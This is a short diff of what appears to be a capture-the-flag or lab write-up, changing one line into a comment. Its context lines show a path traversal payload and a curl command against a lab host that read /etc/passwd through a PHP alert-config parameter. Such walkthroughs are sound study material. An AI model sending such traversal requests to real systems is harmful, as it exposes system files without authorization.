@@ -110,7 +110,7 @@ Now, let's go to **searchsploit** and search if there is any vulnerability docum
   # We basically include the following link:
   /alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
   
-  so the full URL becomes:
+  #so the full URL becomes:
   curl http://10.10.74.120/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
 
   ```
